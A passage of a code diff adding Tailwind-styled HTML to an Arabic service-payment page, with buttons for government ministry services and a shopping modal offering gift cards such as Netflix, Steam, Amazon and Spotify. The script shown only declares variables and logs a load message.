+<h3 class="font-bold text-lg mb-2">الأحوال المدنية</h3>
+</button>
+<button class="p-8 bg-gradient-to-br from-purple-600/20 to-purple-800/20 border-2 border-purple-500/30 rounded-2xl hover:border-purple-400 hover:bg-purple-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات وزارة العدل')">
+<i class="fas fa-gavel text-5xl text-purple-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">وزارة العدل</h3>
+</button>
+<button class="p-8 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات وزارة العمل')">
+<i class="fas fa-briefcase text-5xl text-orange-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">وزارة العمل</h3>
+</button>
+<button class="p-8 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات وزارة الصحة')">
+<i class="fas fa-hospital text-5xl text-red-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">وزارة الصحة</h3>
+</button>
+<button class="p-8 bg-gradient-to-br from-cyan-600/20 to-cyan-800/20 border-2 border-cyan-500/30 rounded-2xl hover:border-cyan-400 hover:bg-cyan-600/30 transition-all text-center group" onclick="selectServiceAndAmount('government', 'خدمات وزارة التعليم')">
+<i class="fas fa-graduation-cap text-5xl text-cyan-400 mb-4 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">وزارة التعليم</h3>
+</button>
+</div>
+</div>
+</div>
+<!-- Shopping Modal -->
+<div class="modal" id="shoppingModal">
+<div class="modal-content w-full max-w-5xl text-white">
+<div class="flex items-center justify-between mb-8">
+<h2 class="text-3xl font-bold bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">🛍️ التسوق والترفيه</h2>
+<button class="p-3 hover:bg-gray-700 rounded-lg transition-colors" onclick="closeModal('shoppingModal')">
+<i class="fas fa-times text-xl text-gray-400"></i>
+</button>
+</div>
+<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+<button class="p-6 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة نتفليكس')">
+<i class="fas fa-play text-4xl text-red-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">نتفليكس</h3>
+<p class="text-gray-400 text-sm">اشتراكات المشاهدة</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة ستيم')">
+<i class="fas fa-gamepad text-4xl text-blue-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">ستيم</h3>
+<p class="text-gray-400 text-sm">بطاقات الألعاب</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-gray-600/20 to-gray-800/20 border-2 border-gray-500/30 rounded-2xl hover:border-gray-400 hover:bg-gray-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة آيتونز')">
+<i class="fab fa-apple text-4xl text-gray-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">آيتونز</h3>
+<p class="text-gray-400 text-sm">App Store &amp; iTunes</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة جوجل بلاي')">
+<i class="fab fa-google-play text-4xl text-green-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">جوجل بلاي</h3>
+<p class="text-gray-400 text-sm">متجر جوجل</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-orange-600/20 to-orange-800/20 border-2 border-orange-500/30 rounded-2xl hover:border-orange-400 hover:bg-orange-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة أمازون')">
+<i class="fab fa-amazon text-4xl text-orange-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">أمازون</h3>
+<p class="text-gray-400 text-sm">تسوق أونلاين</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-blue-600/20 to-blue-800/20 border-2 border-blue-500/30 rounded-2xl hover:border-blue-400 hover:bg-blue-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة كارفور')">
+<i class="fas fa-shopping-cart text-4xl text-blue-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">كارفور</h3>
+<p class="text-gray-400 text-sm">هايبر ماركت</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-green-600/20 to-green-800/20 border-2 border-green-500/30 rounded-2xl hover:border-green-400 hover:bg-green-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة سبوتيفاي')">
+<i class="fab fa-spotify text-4xl text-green-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">سبوتيفاي</h3>
+<p class="text-gray-400 text-sm">موسيقى وبودكاست</p>
+</button>
+<button class="p-6 bg-gradient-to-br from-red-600/20 to-red-800/20 border-2 border-red-500/30 rounded-2xl hover:border-red-400 hover:bg-red-600/30 transition-all text-center group" onclick="selectServiceAndAmount('shopping', 'بطاقة يوتيوب بريميوم')">
+<i class="fab fa-youtube text-4xl text-red-400 mb-3 group-hover:scale-110 transition-transform"></i>
+<h3 class="font-bold text-lg mb-2">يوتيوب</h3>
+<p class="text-gray-400 text-sm">Premium &amp; Music</p>
+</button>
+</div>
+</div>
+</div>
+<script>
         // Global Variables
         let currentAmount = 0;
         let currentService = '';
@@ -1937,6 +1868,4 @@
 
         console.log('🎉 تم تحميل جميع السكريبتات بنجاح - الموقع جاهز للاستخدام!');
     </script>
-
-
 </body></html>
